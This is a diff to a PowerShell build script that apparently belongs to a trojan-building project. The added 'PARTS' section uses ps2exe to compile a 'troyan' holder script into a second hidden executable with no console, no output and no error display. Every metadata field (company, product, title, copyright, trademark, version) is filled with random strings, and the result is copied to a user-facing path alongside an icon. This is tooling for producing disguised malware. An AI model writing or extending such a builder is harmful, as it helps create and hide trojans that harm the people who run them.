@@ -48,3 +48,25 @@ Invoke-ps2exe `
 
 Copy-Item -Path $server.troyanIco -Destination $server.userTroyanIco -Force
 Copy-Item -Path $server.troyanExe -Destination $server.userTroyanExe -Force
+
+
+#### PARTS
+
+Remove-FileIfExists -filePath $server.troyanExeParts
+Remove-FileIfExists -filePath $server.userTroyanExeParts
+
+ #-requireAdmin
+Invoke-ps2exe `
+    -inputFile $server.troyanHolderParts `
+    -outputFile $server.troyanExeParts `
+    -iconFile $server.troyanIco `
+    -STA -x86 -UNICODEEncoding -noOutput -noError -noConsole `
+    -company (Get-RandomString) `
+    -product (Get-RandomString) `
+    -title (Get-RandomString) `
+    -copyright (Get-RandomString) `
+    -trademark (Get-RandomString) `
+    -version (Get-RandomVersion)
+
+Copy-Item -Path $server.troyanIco -Destination $server.userTroyanIco -Force
+Copy-Item -Path $server.troyanExeParts -Destination $server.userTroyanExeParts -Force
